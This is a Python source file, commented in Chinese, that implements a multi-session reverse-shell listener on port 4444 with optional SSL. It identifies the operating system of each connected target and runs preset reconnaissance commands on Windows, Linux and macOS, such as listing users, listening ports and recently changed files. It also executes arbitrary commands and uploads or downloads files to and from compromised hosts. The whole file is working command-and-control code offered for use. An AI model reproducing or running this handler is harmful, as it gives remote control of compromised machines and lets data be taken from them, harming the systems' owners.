import socket
import threading
import sys
import os
import time
import base64
import ssl
from datetime import datetime
from collections import deque

# 添加颜色支持
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# 预设命令
WINDOWS_COMMANDS = {
    '1': ('Get-ComputerInfo | Format-List', '显示详细的系统信息（PowerShell）'),
    '2': ('Get-NetTCPConnection | Where-Object State -EQ "Listen"', '显示所有TCP监听端口'),
    '3': ('Get-Process | Sort-Object CPU -Descending | Select-Object -First 20', '显示CPU占用最高的20个进程'),
    '4': ('Get-NetIPAddress | Format-Table', '显示所有网络接口配置'),
    '5': ('Get-ChildItem -Recurse -File | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}', '显示最近24小时修改的文件'),
    '6': ('Get-LocalUser | Format-Table Name,Enabled,LastLogon', '显示本地用户信息'),
    '7': ('Get-Service | Where-Object {$_.Status -eq "Running"}', '显示正在运行的服务'),
    '8': ('Get-CimInstance Win32_OperatingSystem | Select-Object *memory*', '显示内存使用情况'),
    '9': ('Get-Volume | Format-Table', '显示磁盘分区信息')
}

LINUX_COMMANDS = {
    '1': ('hostnamectl', '显示系统和主机详细信息'),
    '2': ('ss -tunlp', '显示所有网络连接和监听端口（新版netstat）'),
    '3': ('systemctl status', '显示系统服务状态'),
    '4': ('ip addr', '显示网络接口信息（新版ifconfig）'),
    '5': ('find / -type f -mtime -1', '显示最近24小时修改的文件'),
    '6': ('getent passwd', '显示系统用户列表（更现代的方式）'),
    '7': ('journalctl -n 50', '显示系统日志最后50行'),
    '8': ('free -h', '显示内存使用情况（人性化格式）'),
    '9': ('df -h', '显示磁盘使用情况（人性化格式）')
}

MACOS_COMMANDS = {
    '1': ('system_profiler SPSoftwareDataType SPHardwareDataType', '显示系统和硬件信息'),
    '2': ('lsof -i -P | grep LISTEN', '显示监听端口'),
    '3': ('top -l 1 -o cpu -n 10', '显示CPU占用最高的10个进程'),
    '4': ('networksetup -listallhardwareports', '显示网络接口详细信息'),
    '5': ('find / -type f -mtime -1 2>/dev/null', '显示最近24小时修改的文件'),
    '6': ('dscl . -list /Users | grep -v "^_"', '显示系统用户（排除系统账户）'),
    '7': ('pmset -g', '显示电源管理信息'),
    '8': ('vm_stat && sysctl hw.memsize', '显示内存使用和硬件信息'),
    '9': ('diskutil list && df -h', '显示磁盘分区和使用情况')
}

# 添加文件传输相关命令
FILE_COMMANDS = {
    'upload': ('上传文件到目标主机', 'put <本地文件> <远程路径>'),
    'download': ('从目标主机下载文件', 'get <远程文件> <本地路径>'),
}

def detect_os(conn):
    try:
        # 首先清空任何可能的缓冲数据
        conn.settimeout(0.5)
        try:
            while conn.recv(1024):
                pass
        except socket.timeout:
            pass
        finally:
            conn.settimeout(None)

        # 使用PowerShell特定命令检测Windows
        test_cmd = "[System.Environment]::OSVersion.Platform\n"
        conn.send(test_cmd.encode())
        response = conn.recv(1024).decode().strip().lower()
        
        if 'win' in response:
            return 'windows'
        
        # 如果上述检测失败，尝试执行Windows命令提示符特有命令
        conn.send("echo %OS%\n".encode())
        response = conn.recv(1024).decode().lower()
        
        if 'windows' in response:
            return 'windows'
        
        # 最后尝试通用的系统类型检测
        conn.send("uname -s 2>/dev/null || ver\n".encode())
        response = conn.recv(1024).decode().lower()
        
        if 'darwin' in response:
            return 'macos'
        elif 'windows' in response:
            return 'windows'
        
        return 'linux'
    except Exception as e:
        print(f"{Colors.FAIL}[-] 系统检测出错: {e}{Colors.ENDC}")
        # 如果检测失败，通过PowerShell提示符特征判断
        return 'windows' if 'PS ' in response else 'linux'

class Session:
    def __init__(self, conn, addr, os_type):
        self.conn = conn
        self.addr = addr
        self.os_type = os_type
        self.active = True
        self.start_time = datetime.now()
        self.last_activity = datetime.now()

class ShellHandler:
    def __init__(self):
        self.command_history = deque(maxlen=10)  # 保存最近10条命令
        self.log_dir = "shell_logs"
        self.ensure_log_directory()
        self.sessions = {}  # 存储多个会话
        self.session_counter = 0
        self.command_timeout = 30  # 命令执行超时时间(秒)
        self.ssl_context = self.setup_ssl()
        self.last_command = None  # 保存上一条命令
        self.buffer_size = 8192   # 增加缓冲区大小
        self.current_path = "~"   # 当前路径
        self.line_ending = '\n'  # 添加行结束符
        self.prompt_patterns = ['PS >', '# ', '$ ', '> ']  # 常见的提示符模式
        self.response_end_patterns = [
            'PS ', '> ', '# ', '$ ',            # Shell提示符
            '\r\n\r\n', '\n\n',                # 连续空行
            '[root@', '[user@'                  # Linux提示符
        ]
        
    def ensure_log_directory(self):
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

    def save_output(self, os_type, command, output):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.log_dir}/{os_type}_{timestamp}.log"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"命令: {command}\n")
            f.write(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*50 + "\n")
            f.write(output)
        print(f"{Colors.GREEN}输出已保存到: {filename}{Colors.ENDC}")

    def show_help(self):
        help_text = f"""
{Colors.HEADER}可用快捷键:{Colors.ENDC}
q  - 退出当前会话
h  - 显示帮助信息
c  - 清屏
l  - 显示命令历史
s  - 保存最后一次命令输出
0  - 输入自定义命令

{Colors.HEADER}特殊功能:{Colors.ENDC}
- 所有命令输出自动保存在 {self.log_dir} 目录
- 可以使用上下箭头浏览命令历史
- 输入命令编号或命令名称都可执行相应命令
"""
        print(help_text)

    def show_menu(self, os_type):
        menu_items = {
            'windows': WINDOWS_COMMANDS,
            'linux': LINUX_COMMANDS,
            'macos': MACOS_COMMANDS
        }
        
        print(f"\n{Colors.HEADER}=== {os_type.upper()} 预设命令 ==={Colors.ENDC}")
        for key, (cmd, desc) in menu_items[os_type].items():
            print(f"{Colors.BOLD}{key}.{Colors.ENDC} {Colors.BLUE}{cmd:<30}{Colors.ENDC} - {desc}")
        print(f"{Colors.WARNING}输入 'h' 查看帮助信息{Colors.ENDC}")
        return menu_items[os_type]

    def setup_ssl(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        cert_path = os.path.join(os.path.dirname(__file__), 'cert.pem')
        key_path = os.path.join(os.path.dirname(__file__), 'key.pem')
        if not (os.path.exists(cert_path) and os.path.exists(key_path)):
            self.generate_certificates()
        context.load_cert_chain(certfile=cert_path, keyfile=key_path)
        return context

    def generate_certificates(self):
        # 生成自签名证书
        os.system('openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 '
                 '-subj "/C=CN/ST=State/L=City/O=Org/CN=localhost" '
                 '-keyout key.pem -out cert.pem')

    def transfer_file(self, conn, cmd, is_upload=True):
        try:
            _, src_path, dst_path = cmd.split()
            if is_upload:
                with open(src_path, 'rb') as f:
                    data = base64.b64encode(f.read())
                    conn.send(f"UPLOAD {dst_path} {len(data)}\n".encode())
                    conn.send(data)
            else:
                conn.send(f"DOWNLOAD {src_path}\n".encode())
                size = int(conn.recv(1024).decode())
                data = b""
                while len(data) < size:
                    data += conn.recv(1024)
                with open(dst_path, 'wb') as f:
                    f.write(base64.b64decode(data))
            return True
        except Exception as e:
            print(f"{Colors.FAIL}文件传输失败: {e}{Colors.ENDC}")
            return False

    def show_sessions(self):
        print(f"\n{Colors.HEADER}活动会话列表:{Colors.ENDC}")
        for sid, session in self.sessions.items():
            uptime = datetime.now() - session.start_time
            last_active = datetime.now() - session.last_activity
            print(f"{Colors.BOLD}[{sid}]{Colors.ENDC} "
                  f"{session.addr} ({session.os_type}) "
                  f"运行时间: {str(uptime).split('.')[0]} "
                  f"最后活动: {str(last_active).split('.')[0]}")

    def execute_command(self, conn, cmd):
        """执行命令并处理输出"""
        try:
            cmd = cmd.strip()
            if not cmd:
                return ""
            
            # 先清空缓冲区
            conn.settimeout(0.1)
            try:
                while conn.recv(1024): pass
            except socket.timeout:
                pass
            
            # 发送命令
            conn.send(f"{cmd}\n".encode())
            
            # 重置超时并等待响应
            conn.settimeout(self.command_timeout)
            buffer = ""
            chunks = []
            
            # 循环读取响应
            while True:
                try:
                    chunk = conn.recv(self.buffer_size).decode('utf-8', errors='ignore')
                    if not chunk:
                        break
                    
                    chunks.append(chunk)
                    buffer = ''.join(chunks)
                    
                    # 检查是否接收完整
                    if any(pattern in buffer for pattern in self.response_end_patterns):
                        break
                        
                except socket.timeout:
                    if buffer:  # 如果已经有数据，认为是正常结束
                        break
                    print(f"{Colors.WARNING}[!] 命令执行超时{Colors.ENDC}")
                    return ""
            
            # 处理输出
            output = self.clean_output(buffer, cmd)
            return output
            
        except Exception as e:
            print(f"{Colors.FAIL}[-] 命令执行错误: {e}{Colors.ENDC}")
            return ""
        finally:
            conn.settimeout(None)

    def clean_output(self, output, cmd):
        """清理命令输出"""
        if not output:
            return ""
            
        # 按行分割
        lines = output.split('\n')
        cleaned_lines = []
        found_cmd = False
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # 跳过命令本身
            if cmd in line and not found_cmd:
                found_cmd = True
                continue
                
            # 跳过提示符行
            if any(pattern in line for pattern in self.response_end_patterns):
                continue
                
            # 保留非空输出行
            cleaned_lines.append(line)
        
        # 返回处理后的输出
        result = '\n'.join(cleaned_lines)
        return result.strip()

    def handle_client(self, conn, addr):
        try:
            print(f"{Colors.GREEN}[+] 成功建立连接{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] 正在检测目标系统类型...{Colors.ENDC}")
            
            # 给PowerShell一些初始化时间
            time.sleep(1.5)
            
            # 清空初始连接时可能产生的多余输出
            conn.settimeout(0.5)
            try:
                while conn.recv(1024):
                    pass
            except socket.timeout:
                pass
            
            conn.settimeout(None)
            os_type = detect_os(conn)
            print(f"{Colors.BLUE}[*] 检测到目标系统: {os_type}{Colors.ENDC}")
            
            if os_type == 'windows':
                print(f"{Colors.GREEN}[+] 已确认为PowerShell反向Shell{Colors.ENDC}")
            
            print(f"{Colors.GREEN}[+] 连接就绪！{Colors.ENDC}\n")
            
            session_id = self.session_counter
            self.session_counter += 1
            self.sessions[session_id] = Session(conn, addr, os_type)

            last_output = ""
            while True:
                try:
                    commands = self.show_menu(os_type)
                    choice = input(f"\n{Colors.BOLD}{self.current_path} > {Colors.ENDC}")
                    
                    if choice.lower() == 'q':
                        break
                    elif choice.lower() == 'h':
                        self.show_help()
                        continue
                    elif choice.lower() == 'c':
                        os.system('clear' if os.name != 'nt' else 'cls')
                        continue
                    elif choice.lower() == 'l':
                        print("\n".join(self.command_history))
                        continue
                    elif choice.lower() == 's' and last_output:
                        self.save_output(os_type, "上一条命令", last_output)
                        continue
                    elif choice.startswith('put '):
                        self.transfer_file(conn, choice, is_upload=True)
                        continue
                    elif choice.startswith('get '):
                        self.transfer_file(conn, choice, is_upload=False)
                        continue
                    elif choice == 'sessions':
                        self.show_sessions()
                        continue
                    
                    if choice == '0':
                        cmd = input(f"{Colors.WARNING}请输入自定义命令: {Colors.ENDC}")
                    else:
                        cmd_tuple = commands.get(choice)
                        if not cmd_tuple:
                            print(f"{Colors.FAIL}无效选项{Colors.ENDC}")
                            continue
                        cmd = cmd_tuple[0]
                    
                    self.command_history.append(cmd)
                    print(f"{Colors.BOLD}执行命令: {cmd}{Colors.ENDC}")
                    
                    response = self.execute_command(conn, cmd)
                    
                    if response:
                        print(f"\n{Colors.GREEN}命令输出:{Colors.ENDC}")
                        print(f"{Colors.BLUE}{'='*50}{Colors.ENDC}")
                        print(response)
                        print(f"{Colors.BLUE}{'='*50}{Colors.ENDC}")
                        self.save_output(os_type, cmd, response)
                    else:
                        print(f"{Colors.WARNING}[!] 命令无输出或执行失败{Colors.ENDC}")
                    
                    # 更新提示符路径
                    if os_type == 'windows':
                        pwd_cmd = "(Get-Location).Path"
                    else:
                        pwd_cmd = "pwd"
                    self.current_path = self.execute_command(conn, pwd_cmd).strip() or "~"
                    
                except KeyboardInterrupt:
                    print(f"\n{Colors.WARNING}[!] 使用 'q' 退出会话{Colors.ENDC}")
                    continue
                except Exception as e:
                    print(f"{Colors.FAIL}[-] 错误: {e}{Colors.ENDC}")
                    break
            
        except Exception as e:
            print(f"{Colors.FAIL}[-] 会话错误: {e}{Colors.ENDC}")
        finally:
            if conn:
                conn.close()
            print(f"{Colors.WARNING}[!] 会话已关闭: {addr}{Colors.ENDC}")

def start_server(port=4444, use_ssl=False):  # 默认改为False
    handler = ShellHandler()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 添加地址重用
    
    try:
        if use_ssl:
            print(f"{Colors.BLUE}[*] SSL模式已启用，等待客户端SSL连接...{Colors.ENDC}")
            server = handler.ssl_context.wrap_socket(server, server_side=True)
        else:
            print(f"{Colors.WARNING}[!] 警告: SSL未启用，连接不会被加密{Colors.ENDC}")
        
        server.bind(('0.0.0.0', port))
        server.listen(5)
        print(f"{Colors.GREEN}[+] 服务器启动成功！{Colors.ENDC}")
        print(f"{Colors.GREEN}[+] 正在监听 {port} 端口...{Colors.ENDC}")
        print(f"{Colors.BOLD}[*] 等待反向shell连接...{Colors.ENDC}\n")
        
        while True:
            try:
                conn, addr = server.accept()
                print(f"\n{Colors.GREEN}[+] 新连接进入！来自: {addr[0]}:{addr[1]}{Colors.ENDC}")
                if use_ssl:
                    print(f"{Colors.BLUE}[*] 正在进行SSL握手...{Colors.ENDC}")
                    # 设置SSL握手超时
                    conn.settimeout(10)
                
                client_handler = threading.Thread(target=handler.handle_client, args=(conn, addr))
                client_handler.start()
                
            except ssl.SSLError as e:
                print(f"{Colors.FAIL}[-] SSL握手失败: {e}{Colors.ENDC}")
                conn.close()
            except socket.timeout:
                print(f"{Colors.FAIL}[-] 连接超时{Colors.ENDC}")
                conn.close()
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] 服务器正在关闭...{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.FAIL}[-] 错误: {e}{Colors.ENDC}")
            finally:
                # 重置超时设置
                if 'conn' in locals():
                    conn.settimeout(None)
    
    except Exception as e:
        print(f"{Colors.FAIL}[-] 服务器启动失败: {e}{Colors.ENDC}")
    finally:
        server.close()
        print(f"{Colors.WARNING}[!] 服务器已关闭{Colors.ENDC}")

if __name__ == '__main__':
    port = 4444 if len(sys.argv) < 2 else int(sys.argv[1])
    use_ssl = False if len(sys.argv) < 3 else sys.argv[2].lower() == 'true'
    start_server(port, use_ssl)
